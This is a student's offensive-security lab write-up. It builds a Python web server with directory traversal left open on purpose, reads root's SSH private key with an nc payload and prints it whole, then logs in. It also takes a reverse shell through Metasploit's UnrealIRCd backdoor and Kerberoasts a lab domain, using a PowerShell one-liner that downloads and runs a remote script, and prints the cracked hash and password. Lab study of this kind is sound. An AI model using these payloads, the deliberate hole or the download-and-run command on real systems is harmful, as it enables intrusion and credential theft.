

Artem Abramov



## Task 1 - Privilege escalation

### Instance preparation

The vulnerability is a Python3-based web server which is vulnerable to directory traversal. Server code is based on official python3 http.server module. The code in the python repository has a check that removes references to current and parent directories (see: https://github.com/python/cpython/blob/master/Lib/http/server.py#L837) The modified server has this check removed. 

The vulnerable code running on the server is shown below (changes in line 837):

```python
 836         words = path.split('/')
 837         words = filter(None, words)
 838         path = self.directory
 839         for word in words:
 840             if os.path.dirname(word):
 841                 # Ignore components that are not a simple file/directory name
 842                 continue
 843             path = os.path.join(path, word)
```

Because of this its possible to perform directory traversal with a crafted payload:

```bash
$ echo -e 'GET ../../root/.ssh/id_rsa HTTP/1.1\r\n' | nc webserverIP 8080
```

Note: this payload is difficult to deliver using either browser, postman or wget tools because they shorten '../../' to a single '/' before actually sending it. 

But its possible to deliver it using simple echo and netcat. Then the server will happily serve the request. Below is how the request is seen in the server logs:

```bash
$ python3 server.py 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
127.0.0.1 - - [26/Apr/2020 23:02:24] "GET ../../root/.ssh/id_rsa HTTP/1.1" 200 -
```

Example request and response client side view:

```
$ echo -e 'GET ../../root/.ssh/id_rsa HTTP/1.1\r\n' | nc webserverIP 8080
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.2
Date: Sun, 26 Apr 2020 23:53:21 GMT
Content-type: application/octet-stream
Content-Length: 3401
Last-Modified: Sun, 26 Apr 2020 20:34:44 GMT

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Then the stolen ssh keys can be used to login and compromise the system. 

Save it to a file (e.g `temp.id`), then make the file readable only by owner (ssh client requires this):

```bash
$ chmod 700 tmp.id 
```

Then use the identity during login:

```bash
$ ssh root@webserverIP -i tmp.id 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

e907961bc122:~# 
```



### Deliver

- I exported my GNS3 solution using `File->Export portable project` menu option and send that file to the other team.
- As a lightweight alternative I packed the vulnerable code into a Docker image and uploaded it to docker hub. 



To get the container:

```
docker pull temach/vulnerable-webserver
```

And run it (expose webserver on port 8080 and ssh on port 22):

```
docker run -d -p 8080:8080 -p 22:22 temach/vulnerable-webserver
```

Notes for preparing the container: 

- https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image
- https://wiki.alpinelinux.org/wiki/Setting_up_a_ssh-server
- https://stackoverflow.com/questions/7439563/how-to-ssh-to-localhost-without-password
- https://askubuntu.com/questions/308045/differences-between-bin-sbin-usr-bin-usr-sbin-usr-local-bin-usr-local
- https://stackoverflow.com/questions/35690954/running-openssh-in-an-alpine-docker-container









### Attack

- Find out what kind of vulnerability you were proposed by your opponent team.
- Understand the process and describe how it works.
- Hack it.



I choose to attack team Ali & Gaspar. The attack path was via vulnerability in Unreal IRC client. The lab was setup in the SNE LAN, but I could access via a lightweight VM that Pierre gave me on that network.

Run the console and search for vulenrability:

```
msf5 > search irc

Matching Modules
================

   #   Name                                              Disclosure Date  Rank       Check  Description
   -   ----                                              ---------------  ----       -----  -----------
   0   auxiliary/dos/windows/llmnr/ms11_030_dnsapi       2011-04-12       normal     No     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
 ...
   12  exploit/unix/irc/unreal_ircd_3281_backdoor        2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
 ...
   21  post/multi/gather/irssi_creds                                      normal     No     Multi Gather IRSSI IRC Password(s)
```



I am interested in 

```
exploit/unix/irc/unreal_ircd_3281_backdoor
```

Set options and payload:

```
> set RHOSTS 10.1.1.129
> show payloads

Compatible Payloads
===================

   #   Name                                Disclosure Date  Rank    Check  Description
   -   ----                                ---------------  ----    -----  -----------
   0   cmd/unix/bind_perl                                   manual  No     Unix Command Shell, Bind TCP (via Perl)
   1   cmd/unix/bind_perl_ipv6                              manual  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2   cmd/unix/bind_ruby                                   manual  No     Unix Command Shell, Bind TCP (via Ruby)
   3   cmd/unix/bind_ruby_ipv6                              manual  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4   cmd/unix/generic                                     manual  No     Unix Command, Generic Command Execution
   5   cmd/unix/reverse                                     manual  No     Unix Command Shell, Double Reverse TCP (telnet)
   6   cmd/unix/reverse_bash_telnet_ssl                     manual  No     Unix Command Shell, Reverse TCP SSL (telnet)
   7   cmd/unix/reverse_perl                                manual  No     Unix Command Shell, Reverse TCP (via Perl)
   8   cmd/unix/reverse_perl_ssl                            manual  No     Unix Command Shell, Reverse TCP SSL (via perl)
   9   cmd/unix/reverse_ruby                                manual  No     Unix Command Shell, Reverse TCP (via Ruby)
   10  cmd/unix/reverse_ruby_ssl                            manual  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   11  cmd/unix/reverse_ssl_double_telnet                   manual  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

> set payload cmd/unix/reverse
> set LHOST 10.1.1.9
```



Running the exploit:

```
exploit

[*] Started reverse TCP double handler on 10.1.1.9:4444 
[*] 10.1.1.129:6667 - Connected to 10.1.1.129:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 10.1.1.129:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 4WdGac9cf6JLJH4Y;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "4WdGac9cf6JLJH4Y\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.1.1.9:4444 -> 10.1.1.129:42240) at 2020-04-28 17:43:20 +0300

ls -la
total 396
drwx------  7 root root   4096 May 20  2012 .
drwxr-xr-x 94 root root   4096 Apr 28 06:07 ..
-rw-------  1 root root   1365 May 20  2012 Donation
-rw-------  1 root root  17992 May 20  2012 LICENSE
drwx------  2 root root   4096 May 20  2012 aliases
--w----r-T  1 root root   1175 May 20  2012 badwords.channel.conf
--w----r-T  1 root root   1183 May 20  2012 badwords.message.conf
--w----r-T  1 root root   1121 May 20  2012 badwords.quit.conf
-rwx------  1 root root 242894 May 20  2012 curl-ca-bundle.crt
-rw-------  1 root root   1900 May 20  2012 dccallow.conf
drwx------  2 root root   4096 May 20  2012 doc
--w----r-T  1 root root  49552 May 20  2012 help.conf
-rw-------  1 root root   2226 Apr 28 06:07 ircd.log
-rw-------  1 root root      6 Apr 28 06:07 ircd.pid
-rw-------  1 root root      4 Apr 28 10:42 ircd.tune
drwx------  2 root root   4096 May 20  2012 modules
drwx------  2 root root   4096 May 20  2012 networks
--w----r-T  1 root root   5656 May 20  2012 spamfilter.conf
drwx------  2 root root   4096 Apr 28 06:07 tmp
-rwx------  1 root root   4042 May 20  2012 unreal
--w----r-T  1 root root   3884 May 20  2012 unrealircd.conf
```

Now we can proceed to do something malicious.



## Task 2 - Kerberoasting

### Environment preparation

- Download and install Windows Server and build your Active Directory.
- Setup vulnerable Service Principal Name (SPN) on your domain controller.
- Add a standard user. Setup a host which will use this credentials and add it to your domain.



I did not have any way to access my computer in the lab, therefore I tried to setup the environment in GNS3.

**Install windows as appliance inside GNS3**

source:

- https://github.com/GNS3/gns3-registry/blob/master/appliances/windows_server.gns3a

Below is modified gns3 appliance file for windows server:

```
{
    "name": "Windows Server",
    "category": "guest",
    "description": "Microsoft Windows",
    "vendor_name": "Microsoft",
    "vendor_url": "http://www.microsoft.com/",
    "documentation_url": "https://technet.microsoft.com/en-us/library/cc498727.aspx",
    "product_name": "Windows Server",
    "product_url": "https://www.microsoft.com/en-us/windows",
    "registry_version": 4,
    "status": "stable",
    "availability": "free-to-try",
    "maintainer": "GNS3 Team",
    "maintainer_email": "developers@gns3.net",
    "symbol": "microsoft.svg",
    "port_name_format": "NIC{port1}",
    "qemu": {
        "adapter_type": "e1000",
        "adapters": 1,
        "ram": 2048,
        "hda_disk_interface": "sata",
        "arch": "x86_64",
        "console_type": "vnc",
        "boot_priority": "c",
        "kvm": "require",
        "options": "-usbdevice tablet"
    },
    "images": [
        {
            "filename": "windows-server-2016-v1607-build-10.0.14393.2097-eng-26.02.2018.iso",
            "version": "2016",
            "md5sum": "e4d94afc2509d3b6f6191d422dfdd730",
            "filesize": 4695359488,
            "download_url": "https://rutracker.org/forum/viewtopic.php?t=5526813"
        },
        {
            "filename": "empty100G.qcow2",
            "version": "1.0",
            "md5sum": "1e6409a4523ada212dea2ebc50e50a65",
            "filesize": 198656,
            "download_url": "https://sourceforge.net/projects/gns-3/files/Empty%20Qemu%20disk/",
            "direct_download_url": "http://sourceforge.net/projects/gns-3/files/Empty%20Qemu%20disk/empty100G.qcow2/download"
        }

    ],
    "versions": [
        {
            "name": "2016",
            "images": {
                "hda_disk_image": "empty100G.qcow2",
                "cdrom_image": "windows-server-2016-v1607-build-10.0.14393.2097-eng-26.02.2018.iso"
            }
        }
    ]
}
```

The changes are:

- use different ISO (also change md5sum and filesize)

**Send CTRL+ALT+DEL to windows VM**

sources:

- https://askubuntu.com/questions/695017/why-does-my-xdotool-key-command-not-work
- https://stackoverflow.com/questions/34207981/how-do-you-get-window-id-for-xdotool-automatically

A problem occurred with sending CTRL+ALT+DEL combo to the windows VM through VNC. Step one - disable CTRL+ALT+DEL shortcut in Ubuntu keyboard preferences. Determine the window (run command and click on the TigerVNC window:

```
# xdotool selectwindow
```

Figure out what key names to use (type CTRL, ALT, DEL):

```
# xev
KeyPress event, serial 37, synthetic NO, window 0x7000001,
    root 0x191, subw 0x0, time 20898518, (227,356), root:(398,517),
    state 0x0, keycode 119 (keysym 0xffff, Delete), same_screen YES,
    XLookupString gives 1 bytes: (7f) ""
    XmbLookupString gives 1 bytes: (7f) ""
    XFilterEvent returns: False
```

For xdotool look at the part as shown below:

```
(keysym 0xffff, Delete)
```

The final command to send CTRL+ALT+DEL:

```
# xdotool windowfocus 37748739 && xdotool key 'Control_L+Alt_L+Delete'
```



However in the end I had to resort to using VirtualBox, because it used RAM and CPU more efficiently and only then I was able to run 3 VMs to get the lab finished.



**Configure Active Directory**

source: https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-setting-up-active-directory-in-windows-server-2016

Selecting AD and DNS services for installation using Server Manager and installing components is shown below:

![domaincontroller (OT-Lab-4-LDAP-active-directory.assets/domaincontroller%20(Snapshot)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_008.png) [Running] - Oracle VM VirtualBox_008](../Pictures/domaincontroller%20(Snapshot)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_008.png)



This is the only AD node so it must be promoted to become a domain-controller for domain, here I used `rebeladmin.net` to match the example settings in the guide for setting up AD. The config for my AD domain-controller setup (as a single script) is shown below:

![domaincontroller [Running] - Oracle VM VirtualBox_007](OT-Lab-4-LDAP-active-directory.assets/domaincontroller%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_007.png)



After installation new management panel appears as shown below:

![domaincontroller (OT-Lab-4-LDAP-active-directory.assets/domaincontroller%20(Snapshot)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_009.png) [Running] - Oracle VM VirtualBox_009](../Pictures/domaincontroller%20(Snapshot)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_009.png)



Create a new service user (pretend its for SQL service) in the domain and give him a simple password (I choose one from cracklib dictionary that comes with Kali Linux):

![VirtualBox_domaincontroller_28_04_2020_20_39_49](OT-Lab-4-LDAP-active-directory.assets/VirtualBox_domaincontroller_28_04_2020_20_39_49.png)



It turn out many of the tasks can be accomplished from Powershell, so to configure the SQL server machine I used powershell commands. This is supposedly the machine running SQL server that a user will try to access, in the Kerberoasting task our goal is to intercept that traffic.

```
# Configure DNS server
Set-DnsClientServerAddress -InterfaceIndex 2 -ServerAddresses 10.0.2.15

# Add the machine with SQL service to the domain
Add-Computer -DomainName rebeladmin.net

# Restart to join the domain
Restart-Computer
```



**Create SPN**

Create SPN with the command as shown below:

![Selection_019](OT-Lab-4-LDAP-active-directory.assets/Selection_019.png)





Check that SPN is detected on the domain controller:

![domaincontroller (OT-Lab-4-LDAP-active-directory.assets/domaincontroller%20(Snapshot)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_013.png) [Running] - Oracle VM VirtualBox_013](../Pictures/domaincontroller%20(Snapshot)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox_013.png)



We can see that the output has

```
Existing SPN found!
```

Meaning that all is ready for Kerberoasting.




### Kerberoasting

- Get the credentials that will make you a boss.

Run the following script in CMD on the attacking machine to get the hash:

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
```

Extract the has as shown below and copy it to linux host for cracking:

![VirtualBox_domaincontroller_28_04_2020_20_24_30](OT-Lab-4-LDAP-active-directory.assets/VirtualBox_domaincontroller_28_04_2020_20_24_30.png)



Hashcat has a special algorithm to crack Kerberos (from its help output):

```
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
```

Using that and a dictionary (in this case a trimmed dictionary was used, because of course the password is known in advance) run hashcat:

```
$ hashcat -m 13100 -o captured.cracked -a 0 hash-kerberoasting.txt rockyou-small.txt --force
```



Output is shown below:

```
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i5-8300H CPU @ 2.30GHz, 2048/5765 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Password length minimum: 0
Password length maximum: 256

.................

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*SVC_SQLService$rebeladmin.net$WIN-F710...c5033d
Time.Started.....: Tue Apr 28 20:18:06 2020 (0 secs)
Time.Estimated...: Tue Apr 28 20:18:06 2020 (0 secs)
Guess.Base.......: File (rockyou-small.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  1650.9 kH/s (1.02ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2001/2001 (100.00%)
Rejected.........: 0/2001 (0.00%)
Restore.Point....: 0/2001 (0.00%)
Candidates.#1....: M_r_C18 -> MYMERMAID5
HWMon.Dev.#1.....: N/A

Started: Tue Apr 28 20:17:59 2020
Stopped: Tue Apr 28 20:18:07 2020
```



And we find the password and the original hash in the output file:

```
cat captured.cracked
$krb5tgs$23$*SVC_SQLService$rebeladmin.net$WIN-F710G2S8D0P/SVC_SQLService.RebelAdmin.net:60111*$a910c0ca743f899b5eddbf3fb1bea0ad$2c63d90c258f60f3ac1b465c08c99a7abe4dab70fbda94dd9cc5de842ccb33193af08a51602ffa5d5763f9b99e41a6e1d381855c1c31fda5c3a91bbaddd606856040d6f179012c4f77886e2b7ee9c3bac7bfe97c1bb9507b2908fa4ba2a696515112518ed46bafd7e8683c5f3f26c95f178529bab203ffe652deb9428ef81482bd4ac8c11861ef03fd44ad007f3b22507e335342b61f2282e4fb443066895663d98bfedd4da8aff34115a7aa5ed56ae0e471f2aa47fed40d8e4c871acaf99d69da98ee8b0f1ac19f37989fc098428b30deb5a0093fde8dd74128d028495384196f0496d30f8bcfad4f844bac5249e3098a62c77a6eae9fb8d97bc66fbe3b4877f4c87e1c7e4016560ea1467d8c86d1e83dafdad30ece1a798d73e00f27bafe402c52e6305fb7962a5fccd25185bd503d63bd0e0d3dd615b0a73731095898de53f29b48dc61677e503ce073436be8eb149c5974d30fa9a3407e11cc688d5a62301bb34654cc21cd44033bf2f9d6b5ad1aa552a09a8d8a103ed6a6842057e806b70964c8907e602f5162f0559ba6cada6f1a24a1fe7eb96db47c678c70a8e62d3a008484498ff937c42b7c5080531adf650d36579b3dde3171f909df384de017d078aa6460d7f4a0ad924518156152aa398be9595a7fa6464372092942309e488f4a533e0b74bede7e22c5472cc0ab29ec33291280978ce5a7faa787084077208aa68d90dd98a2b98f817c4903e4f5764f1c8a9dea815db50ad93cc0c4e4c820753bfcbf0371030c439558ef6cb29391a90adc1574f32d37d65fe8ddb1588ac62b1d8f4a72b56f7f938437e2957e69bab3047b510c9c533507e0c5f8ea46f9ce629b790450d402312f253e58e39ed81b4e1dbee4c854a4d3478e750d0aedc08a2bb330829bdbdb83b2b601fe64749f5095c77d62d2288721ab3f553b76f65a3d0c33a6111c3f1936c47950f62d20150c32e48e16472cf86e06d110a32c09429fd5001f11b807e0678d4c9ef6c89afc23a0f4777612502356af7fe62ce819f21d0194e53a25f184c6d2c76b6ad5b7d19a9929818a85dacb0adc3ff523dc15b5f924ef61db53f022fd1de0aab2670aa85f8db53f064d830699c9b23c251e63abad9905bd6d5b1dc15aaab5892be8aac74ec1e46b0122263eb508830d5998c829fccb31de001dd0e671f5d1b357e4f2eaeb71db5e5e4e13a22a9cb6397d1c78ec8cb0d8c3550e72b803bcee8ed768bfad3e762558aa0bf808af29c95d16a98ae18042b84b00c08d7193fa7eeefbb57fd338dc64807abd15ddce5a1b370476144a75e1819dedb2561fd68ddd1e7cd6f553b8e834a45dffc11c6612b7da922f578c5ac30994933035adad78d32b97bb36c7697d73026d150c7a04b9ecb953b6b24bc17113235c04877c2e7f702a7803834b9aad16e6f37c2a2fdd370c8b1aff33316a8bcd71c65fc924ad3635e8071c571102e98bbbe764142bb2486630037fd5d6614d2587afd60a065c060910bb111ebe54c68365c7b49e8f9d53d3354291c0bcc15ef40966ba861107b36400e48478a7bb3cb047c9ac5d98eb4ec10597fedecdc89ba2f5854bdba4a395c6725f3cf65e6010908827a17295dc8f49f7b2f49be6c6cfa9a7092a476c9d44d31e1ed766edb6d04ba1bac5033d:MYpassword123# 
```



source:

- https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-setting-up-active-directory-in-windows-server-2016
- https://blog.xpnsec.com/kerberos-attacks-part-1/
- https://medium.com/@markmotig/kerberoasting-from-setup-to-cracking-3e8c980f26e8





## Task 3 - Not so serious

You are given the file. Find out what kind of file is what and retrieve the message.

https://drive.google.com/open?id=17bB2p7fJGgvRnV5w4XbbtgTyedOtDXwm



```
The  Resource  Interchange File Format (RIFF) is a simple, binary file format intended for tree like data structures. Many proprietary file formats are built  on  top  of  the  RIFF
format  (e.g.  media  file  formats  like  WAV,  AVI,  DLS,  GIG).
```

Quote from https://manpages.ubuntu.com/manpages/bionic/man1/rifftree.1.html

AVI is a data format that is packed inside a RIFF container. 

Possible tools:

- Hachoir-metadata https://hachoir.readthedocs.io/en/latest/metadata.html
- Binwalk (for executables?) https://github.com/ReFirmLabs/binwalk
- rifftree for RIFF containers 

First examine the container. Install gigtools package to use rifftree.

```
$ rifftree -s xxx.avi
RIFF(AVI )-> (8685694 Bytes)
            LIST(hdrl)-> (8946 Bytes)
                        avih; (56 Bytes)
                        LIST(strl)-> (4356 Bytes)
                                    strh; (56 Bytes)
                                    strf; (80 Bytes)
                                    JUNK; (4120 Bytes)
                                    vprp; (68 Bytes)
                        LIST(strl)-> (4234 Bytes)
                                    strh; (56 Bytes)
                                    strf; (34 Bytes)
                                    JUNK; (4120 Bytes)
                        JUNK; (260 Bytes)
            LIST(INFO)-> (22 Bytes)
                        ISFT; (14 Bytes)
            JUNK; (1016 Bytes)
            LIST(movi)-> (8491018 Bytes)
                        00dc; (8414 Bytes)
                        01wb; (278 Bytes)
                        01wb; (279 Bytes)
                        00dc; (3273 Bytes)
                        01wb; (278 Bytes)
                        00dc; (311 Bytes)
                        01wb; (279 Bytes)
....
                        00dc; (346 Bytes)
                        01wb; (274 Bytes)
                        01wb; (249 Bytes)
                        01wb; (271 Bytes)
                        01wb; (310 Bytes)
                        01wb; (349 Bytes)
                        01wb; (277 Bytes)
            idx1; (184640 Bytes)
```

The rifftree shows file size as 8685694 bytes, actual file size of file  is 8691512 bytes, which is a 5818 bytes of difference. File size is shown below:
```
$ ls -la xxx.avi 
-rw-r--r-- 1 artem artem 8691512 апр 25 22:11 xxx.avi
```

Lets figure out exactly where AVI ends and data starts. Looking at example AVI file downloaded from https://file-examples.com/index.php/sample-video-files/sample-avi-files-download/ we can see that the end of the file has a certain pattern. We find the same pattern repeating in our xxx.avi file. Screenshot of the pattern is shown below:

![-home-artem-Downloads-xxx.avi - Bless_006](OT-Lab-4-LDAP-active-directory.assets/-home-artem-Downloads-xxx.avi%20-%20Bless_006.png)



Therefore we guess that data is the last 5806 bytes of the file. Extract it with:

```
$ tail -c 5806 xxx.avi
lQWGBFsicvABDACTg39odKbKbc4PJS1zaiWe07N3Nme2sk0ifqZT/Ll+DK3ivxmVTVb6egEzDf8b
zsU8zEkHbdSubnxdnG3SgISpFaFf9xGRtQ5DLJ0+5T5f9Ft+vUl7NWaFpOST/KVoTMka1li21/1b
JvbsE+6APY4j5jKh00sxkxZ80KnFqwt/ExN1ut7OG+goI1/ksWoCE4MY5PJnTQEoi47OwpIAbVeN
4lznT4ezqKkeOYIIralPxFgeX4Zv0BxGU6tuBTHLue+qUWYqSIScOPmAHtCImFoRMqCFs90S8UnH
JGxcphV7sznfaUxYT2uD1N3EAPIJSib6Zf1rWTnkxwZIHQI9iaw3U2dqUtypHwQDMD6mcq8MllgC
eP4qL1IoA6/ew5vDTXveCZEDaq+FVfJnYk2HcvQkMOHGzGU4sAtLinEf8THuVCMp76BVtZMqhWCw
cf38UnHSnrImJZdsLuBTthtfGO67nl6VT+IcXjXHU9Y5UjEDBHN23WNOtRIhxrP4hrcuogUAEQEA
Af4HAwKn7hyjJn+nHv8h6dqUkd75ZaU+9x1+qEtvjzy+Mueh0HcUQDC6aluP/GGenAMmZ8ZYVthZ
BzJLMyxgdxYj595+qAaDFxyJpv10L9QMCLdnGVZHzKO4jWKR0ljplam0ulrsNMJLWymGbBDVHKKt
xKDuFfhmml04m2HgMUxI4e3kjlpz76LqHRd/SI+0HsaSQq/Ua0S+ksP4zGm5ntt9BegImYwIOa3v
Sv/mtqGvom+KQI9Z8xeUhk9S1DJzxflPAVp8ifWWsz8db0tN/0Kl0hq7QSErYIQQYKFBHdMIcbUD
G63dEEOmNY+5gqORfHPkT3TdEOIz4dEe/2xQRr8Q4Ua1gI5uGSuC2rqe8Mc7PLcu5A/FjBOUasSv
UUiHS7ZwN7WrrEB1l9bzSZiVgR+0QnXhTh63E1WmwWfHxC4w8U+ey5thNbzq/TjF7y1Vc3T9dQyQ
WeX/AJe+wuM+n4na+Eo+MhXEjbRvOedx5m3n27mAgm6RbUeGDgtRADN4t+HCQUosa7YnZZvjQdf0
2tIMqREYRKx06gRPkm4DkFpyTBcIJbl0VAyn3syjYN7bgBIUJUTt79hVT1udvdJvbahV+H0rREJ3
3y2linYLW0qvfK4rm/HT4Y1EecJ6U8wJBUjvTtI6waeFn5cIzeyfAPhvFQer2V4VNybqURHf67Vh
